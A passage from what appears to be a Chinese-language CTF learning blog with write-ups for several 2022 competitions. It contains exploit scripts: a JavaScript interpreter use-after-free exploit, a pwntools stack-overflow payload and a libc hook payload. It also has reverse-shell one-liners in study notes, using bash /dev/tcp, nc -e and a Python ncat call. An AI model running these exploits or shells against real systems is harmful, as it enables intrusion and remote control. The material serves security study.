sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>      <br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// #include &lt;unistd.h&gt;</span><br><span class="hljs-comment">// #include &lt;asm/unistd.h&gt;</span><br><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_3.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.34&quot;);</span><br><br><br><span class="hljs-keyword">void</span> __libc_start_main()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// void puts_impl()&#123;</span><br><span class="hljs-comment">//     asm(&quot;.intel_syntax noprefix&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov rax,1&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov qword ptr [rax],1&quot;);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></div></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map:"></a>map:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">GLIBC_2<span class="hljs-number">.34</span> &#123;<br>        global: __libc_start_main;<span class="hljs-built_in">puts</span>;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br>GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span> &#123;<br>        global: __libc_start_main;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution 3 - ?"></a>solution 3 - ?</h3><blockquote><p>team solution</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execlp(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;LD_DEBUG=all sudo&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后呢? 没看懂</p><p>呃呃感觉是上一种方法的一个步骤, </p><ul><li>LD_DEBUG能打印出ld在加载共享库时的信息, 包括符号信息. </li><li>PR_SET_NO_NEW_PRIVS让之后的exec执行的新程序无法通过简单的setgid或者修改文件权限获得新的权限. </li></ul><p>这里是解法来源<a href="https://clubby789.me/zer0pts2022/#readflag">link</a> </p><h2 id="jsy"><a href="#jsy" class="headerlink" title="jsy"></a>jsy</h2><p>最短的一个exp, 最长的有几千行不知道在写啥. 最短的也不知道在写啥. </p><p>发现了文档, 原来是一个js解释器, 是一个现成的项目. 那个patch是真是存在的一个漏洞吗? 这代码量也太大了….js也不怎么会…</p><blockquote><p>patch里加的free可以double free，2.35的glibc，可以通过占位控制某个header实现任意地址读写</p><p>没有Buffer，可以用Array，header大小应该是0x90</p><p>Array被free时，貌似只有header被free了，body不会被free</p></blockquote><h3 id="zanderdk的解释"><a href="#zanderdk的解释" class="headerlink" title="@zanderdk的解释:"></a>@zanderdk的解释:</h3><p>Short explanation: We use quite to create a object of type JS_CCFUNCTION which will have c union type bellow:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">js_Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> noTcacheOverwrite[<span class="hljs-number">0x18</span>]; <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">js_Class</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-keyword">int</span> extensible;<br>    js_Property *properties;<br>    <span class="hljs-keyword">int</span> count; <span class="hljs-comment">/* number of properties, for array sparseness check */</span><br>    js_Object *prototype;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>....<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>            js_CFunction function;<br>            js_CFunction constructor;<br>            <span class="hljs-keyword">int</span> length;<br>            <span class="hljs-keyword">void</span> *data; <br>            js_Finalize finalize;<br>        &#125; c;<br></code></pre></div></td></tr></table></figure><p><code>js_CFunction function;</code> is a function pointer. We then free this object (target in hax.js) but keep a refrence to this object and we allocate it back using: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">S_fromCharCode</span><span class="hljs-params">(js_State *J)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, top = js_gettop(J);<br>    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">volatile</span> s = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *p;<br>    Rune c;<br>    <span class="hljs-keyword">if</span> (js_try(J)) &#123;<br>        js_free(J, s);<br>        js_throw(J);<br>    &#125;<br>    s = p = js_malloc(J, (top<span class="hljs-number">-1</span>) * UTFmax + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; top; ++i) &#123;<br>        c = js_touint32(J, i);<br>        p += runetochar(p, &amp;c);<br>    &#125;<br>    *p = <span class="hljs-number">0</span>;<br>    js_pushstring(J, s);<br>    js_endtry(J);<br>    js_free(J, s);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>then we partialy overwrite the function pointer with the addres of static void jsB_read(js_State *J) which will put the content of a file into a JS string.  The problem here is the <code>*p = 0;</code>  in the C above, as it will insert null terminator in the address. Sooo we just run it enough times for ALSR to pick a address with 0 at that position in the address. also runetochar do some utf8 magic to some of the bytes we put in if outside of ascii range. so prop a bit more than 255 actually. </p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">JS_CCFUNCTION = <span class="hljs-number">4</span> <span class="hljs-comment">/* built-in function */</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>    a += <span class="hljs-string">&quot;\x08&quot;</span>;<br>&#125;<br><span class="hljs-keyword">var</span> thingy = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy1 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy2 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy3 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy4 = &#123;&#125;;<br><span class="hljs-keyword">var</span> target = quit;<br><span class="hljs-keyword">var</span> over = <span class="hljs-string">&quot;A&quot;</span>;<br>free(target);<br>free(thingy);<br>a.toLowerCase();<br><br><span class="hljs-keyword">var</span> a = ((target.length) &amp; <span class="hljs-number">0xffffff</span>) - <span class="hljs-number">0x2c2</span>;<br>print(a);<br><br>lol = <span class="hljs-built_in">String</span>.fromCharCode(<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    JS_CCFUNCTION, <span class="hljs-comment">/* +0x18 */</span><br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* +0x1c : extensible */</span><br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* count  */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x0800</span>,      <span class="hljs-comment">/* prototype  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-comment">// partial overwrite start here</span><br>    a &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>)<br><br>print(target(<span class="hljs-string">&quot;/flag.txt&quot;</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>-- EOF --<br></code></pre></div></td></tr></table></figure><h2 id="Escape-maze"><a href="#Escape-maze" class="headerlink" title="Escape maze"></a>Escape maze</h2><p>还没看过. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>conn=remote(<span class="hljs-string">&quot;65.21.255.31&quot;</span>,<span class="hljs-number">34979</span>)<br>r=<span class="hljs-string">b&#x27;0&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    u=conn.recvuntil(<span class="hljs-string">b&#x27;key number:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(u)<br>    nr=u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">2</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">8</span>].replace(<span class="hljs-string">b&#x27;,&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> nr!=r:<br>        conn.sendline(nr)<br>        r=nr<br>    <span class="hljs-keyword">else</span>:<br>        conn.sendline(u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><h1 id="ASIS-CTF-2022-FINA"><a href="#ASIS-CTF-2022-FINA" class="headerlink" title="ASIS CTF 2022 FINA"></a>ASIS CTF 2022 FINA</h1><h2 id="readable-v2"><a href="#readable-v2" class="headerlink" title="readable-v2"></a>readable-v2</h2><h1 id="CSR-2022"><a href="#CSR-2022" class="headerlink" title="CSR 2022"></a>CSR 2022</h1><h2 id="PWNMEPLX"><a href="#PWNMEPLX" class="headerlink" title="PWNMEPLX"></a>PWNMEPLX</h2><blockquote><p>CSR 2022</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">┌──(root💀kali)-[/mnt/LearingList/CTF/PWNMEPLX]<br>└─# checksec pwn             <br>[*] &#x27;/mnt/LearingList/CTF/PWNMEPLX/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></div></td></tr></table></figure><p>这个是取绝对值的x64汇编写法: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401336 8B 45 8C                                   mov     eax, [rbp+var_74]<br>.text:0000000000401339 99                                         cdq<br>.text:000000000040133A 89 D0                                      mov     eax, edx<br>.text:000000000040133C 33 45 8C                                   xor     eax, [rbp+var_74]<br>.text:000000000040133F 29 D0                                      sub     eax, edx<br>.text:0000000000401341 C9                                         leave<br>.text:0000000000401342 C3                                         retn<br></code></pre></div></td></tr></table></figure><p>简单的栈溢出覆盖返回地址居然因为&lt;__vfscanf_internal+133&gt;处的xmmword需要0x10字节对齐而出错…….</p><p>简单的不想多说. 但是还是做了好一会儿, 还在想是不是符号/浮点数的问题, 结果就是一个简单的后门栈溢出.</p><p>这个比赛的pwn题全都是签到, 差点意思. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv one</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>sla=lambda x,y:p.sendlineafter(x,y)<br>itt=lambda :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./pwn.elf64&quot;</span>)<br><br>payload = b<span class="hljs-number">&#x27;b</span><span class="hljs-number">&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">8</span>) + pack(<span class="hljs-number">0x401348</span>, <span class="hljs-number">64</span>)<br>sl(b<span class="hljs-string">&quot;-1&quot;</span>)<br>sl(payload)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="PWNFORTRESS"><a href="#PWNFORTRESS" class="headerlink" title="PWNFORTRESS"></a>PWNFORTRESS</h2><blockquote><p>同上, 不过题目是rev+game. 基本不会</p></blockquote><p>主要问题是明确了glibc版本, 但是ubuntu的2.3几之后的全都是用.zst压缩, dpkg无法解压, 改成了清华源中debian的glibc库, 然后dbg版本的包里面也没有带符号的库文件. 不知道怎么用了, 分析了半天glibc-all-in-one代码不知道怎么改, 索性就没有符号吧. 不过在ubuntu2022里直接运行. </p><p>debian glibc file <a href="https://packages.debian.org/source/bookworm/glibc">catagory</a> | <a href="https://mirror.tuna.tsinghua.edu.cn/debian/pool/main/g/glibc/">tuna</a> mirror site</p><p>不会做. </p><p>unintended solution:</p><p>breakpoint before the level is printed, make it print the last level instead, it will segfault, but the decoded map is in memory</p><hr><p>随便看到一题都有三个标签, cry, misc, pwn, 没接触过的加密和杂项, 属实不会, 还有一些虚拟机逃逸加上什么RISC-JIT之类没听说过的技术. 到处都是知识盲区.</p><h1 id="Hackergame-2022"><a href="#Hackergame-2022" class="headerlink" title="Hackergame 2022"></a>Hackergame 2022</h1><p>简单题略过了, 不太想花时间. 能做的学不到东西, 能学到的基本不会做. </p><p>猫咪问答: 懒得做. 旅行图片: 社工懒得做. 纯耗时间. </p><p>签到: mousedown的事件监听的touchStart函数加上一个logpoint让lefttime不变</p><p>HeiLang: 无聊的语法转换</p><p>Flag自动机: 是window程序, 看了看IDA的反编译代码后发现有消息回调函数, 在cheat engine里让x, y变得不随机, 然后改一个变量进入flag生成. </p><h2 id="One-byte-man"><a href="#One-byte-man" class="headerlink" title="One-byte-man"></a>One-byte-man</h2><p>挺神奇的, 代码里面又是还没看的linux概念………</p><ul><li><p>prctl参数<code>PR_SET_CHILD_SUBREAPER</code>: 设置进程树属性, 使得树中孤儿被收养到最近的<strong>设置了属性的</strong>父进程处.<br>因为该属性<strong>只能通过</strong>execve继承而非fork和clone. </p></li><li><p>认真看了下namespace的man page. <code>CLONE_NEW*</code>一系列flag.  </p></li><li><p>user_namespace: A process’s user and group IDs can be different inside and outside a user namespace. </p><ul><li>namespace是一个树状继承图. 像是setns和unshare和clone可以开辟新的子namespace</li><li><strong>User and group ID mappings: uid_map and gid_map</strong> <ul><li>root namespace的两个文件中可以见到<code>0          0 4294967295</code>, 第三个是有符号数的-1, 其实是指一个length, 这一段的uid都被map了. Since Linux 4.15每个进程可有340行映射. </li><li>不同namespace的process访问同一个process的uid_map文件可能会产生不同的结果. </li><li>因为该行是一个映射, 当访问文件在同一个namespace指<code>内部uid -&gt; 父space uid</code>, 当在不同namespace时指<code>内部uid -&gt; 访问进程space uid</code> </li><li>写入的程序必须在父space或者同一个space; 被映射的uid在进程space内也必须有map; 有相应的caps.</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo echo &#x27;0 1000 1\n1000 0 1&#x27; &gt; /proc/121634/uid_map<br></code></pre></div></td></tr></table></figure><ul><li>The <code>/proc/[pid]/setgroups</code> file<ul><li>setgroups() sets the <em><strong><u>supplementary group IDs</u></strong></em> for the calling process.</li><li>gid_map没设置以及上面的文件显示”deny”时, 不能用setgroups()</li><li>gid_map设置之后(setgroups已确定是否启用)不能通过写入<strong>任何字符</strong>来改变.<br>进程只能从禁止setgroups(未map)变化到允许setgroups(写入allow)</li><li>在Linux 3.19被加入. 解决了”rwx—rwx”文件的问题. 即换到other user反而提权了, by denying any pathway for an unprivileged process to drop groups with setgroups(2).</li></ul></li><li><code>/proc/sys/kernel/overflowuid</code>: 未map时尝试读取uid会显示的数字. 在uid_map第二个field没有map时也可能显示4294967295.</li><li>权限检查时uid会转换到initial user namespace中的uid. </li></ul></li><li><p>capabilities:</p><ul><li>进程有四个set, 文件有p和i加上一个effective bit.</li><li>四个set看了老半天不知道实际是如何操作的, 只有effective和bounding能看明白. bounding应该是个全集, 不过也能够对其进行删减, 意义不明. permitted set应该为该进程允许获得的caps. ambient更是<strong>完全不懂</strong>. </li><li>下图是执行execve时cap的变化情况. 注意到当文件effective bit为1时文件的permitted加入了effective set, 这也是一些blog演示ping文件的利用之处, 即<code>cap_net_raw+ep</code>; 这和ambient有啥不同?</li></ul><img src="../../image/recent_ctf/image-20221026212243834.png" alt="image-20221026212243834" style="zoom:80%;" /></li><li><p>credentials</p><ul><li>看到还有个Filesystem user ID and filesystem group ID, 只能说不知道有什么用, 只看到是和supplementary group IDs一起用于判断文件access permissions.</li><li>Supplementary group IDs: 一个用户属于一个primary group, 同时又属于多个Supplementary group, 这样就不用切换了, 主要是省事. 在<code>id</code>命令第一个group后面跟着的东西就是. </li></ul></li><li><p><code>capsh getcap setcap getpcaps</code> 和 <code>grep Cap /proc/self/status</code> </p></li></ul><h2 id="看不见的彼方"><a href="#看不见的彼方" class="headerlink" title="看不见的彼方"></a>看不见的彼方</h2><p>额, 先看rust去了. </p><h1 id="hack-lu-2022"><a href="#hack-lu-2022" class="headerlink" title="hack.lu 2022"></a>hack.lu 2022</h1><h2 id="ordersystem"><a href="#ordersystem" class="headerlink" title="ordersystem"></a>ordersystem</h2><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>一眼看到python中<code>socket.socket()</code> 先查一下以前没注意的东西.</p><ul><li><p><code>setsockopt</code>使用场景: <a href="https://zhuanlan.zhihu.com/p/77023584">link</a> </p></li><li><p>reuseaddr/reuseport: <a href="https://www.jianshu.com/p/9cc2b5b9ad4d">查询过程源码</a> <a href="https://segmentfault.com/a/1190000020524323">reuseport版本演进</a> </p></li><li><p>bind到 0.0.0.0, 127.0.0.1 localhost 有何<a href="https://stackoverflow.com/questions/20778771">区别</a> </p></li><li><p>在docker环境上遇到一点小问题, 重新build了一下. woc为什么链接没反应?? 好吧重启解决问题了. <code>service docker restart</code> </p></li><li><p><a href="https://www.cnblogs.com/pandana/p/16289320.html">反弹shell</a> </p><ul><li><p>目标要执行的命令: <code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>: 将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p><p><strong>简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上</strong> </p></li><li><p>上面这种是通过bash命令来反弹shell, 还可以通过<a href="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/">python nc perl php命令</a>来reverse.<br><code>nc 192.168.100.113 4444 –e /bin/bash</code> </p><p><code>python -c ‘import socket,subprocess,os;................’</code> </p></li><li><p>而主机要执行<code>nc –lvp 4444</code>命令来监听特定端口号.</p></li></ul></li><li><p>python的bytecode真没了解过, 要暴毙了. 这能上哪儿搜. 跟cpython有挺大关系. 又查到了python vm. 又是python的fundamental, 我要疯了怎么又来这么多的东西. 一看就是一星期的量ahhhhhhhhhhhhhhhhhhhhh</p></li></ul><h3 id="Bytecode-relavant"><a href="#Bytecode-relavant" class="headerlink" title="Bytecode relavant:"></a>Bytecode relavant:</h3><p>到处查东西, 写的挺乱的. 还是python innards部分能看一点. </p><ul><li>python <a href="https://docs.python.org/3/library/functions.html#__import__">built-in function</a>: the last one is <code>__import__</code>, This function is invoked by import statements. Direct use of <code>__import__()</code> is also discouraged in favor of <code>importlib.import_module()</code> <ul><li>e.g. <code>__import__(&#39;os&#39;).system(b&quot;ncat *.*.*.*&quot; &quot;****&quot; &quot;-e /bin/sh&quot;)</code> </li></ul></li><li>ops:<ul><li><code>LOAD_FAST</code>(<em>var_num</em>): Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack. </li><li><code>STORE_FAST</code>(<em>var_num</em>): Stores TOS into the local <code>co_varnames[var_num]</code>.</li><li><code>RETURN_VALUE</code> Returns with TOS to the caller of the function.</li><li><strong>可通过dis.opmap查询inst编码. 想了一小时怎么弄…… 第二个字节是操作数, 就是dis结果的第二个数字</strong>. </li><li><code>BUILD_TUPLE</code>(<em>count</em>): Creates a tuple consuming <em><strong>count</strong></em> items from the stack, and <strong>pushes</strong> the resulting tuple.</li><li><code>CALL_FUNCTION</code>(<em>argc</em>): <strong>pops all arguments</strong> and the <strong>callable object</strong>, makes call, and <strong>pushes the return value</strong>. <ul><li>我真没看出来哪里把参数全部pop出来了……可能是函数内部操作的, switch里call_function后有对stack_pointer的重新赋值.</li><li>特别的是比如print函数是没有返回值的, 但此时仍会有值为None的<code>PyObject*</code>被压入栈中.  在本题中令其参数为0个, 可作为None的一种压入方式. </li></ul></li><li><code>LOAD_METHOD</code>(<em>namei</em>): Loads a method named <code>co_names[namei]</code> <strong>from the TOS object</strong>. TOS is <strong>popped</strong>. <ul><li>if TOS has a method with the correct name, the bytecode pushes the unbound method and TOS. TOS will be used as the first argument (<code>self</code>) by <a href="https://docs.python.org/3.10/library/dis.html#opcode-CALL_METHOD"><code>CALL_METHOD</code></a> when calling the unbound method. </li><li>Otherwise, <code>NULL</code> and the object return by the attribute lookup are pushed. </li></ul></li><li><code>CALL_METHOD</code><em>(argc)</em> 这个参数显而易见了. <ul><li>Positional arguments are on top <strong>+</strong> two items described in <code>LOAD_METHOD</code><br>(either <code>self</code> + an unbound method object <strong>or</strong> <code>NULL</code> + an arbitrary callable)</li><li>直接在3.11消失了. 和<code>LOAD_METHOD</code>进行搭配的是<code>PRECALL</code>. 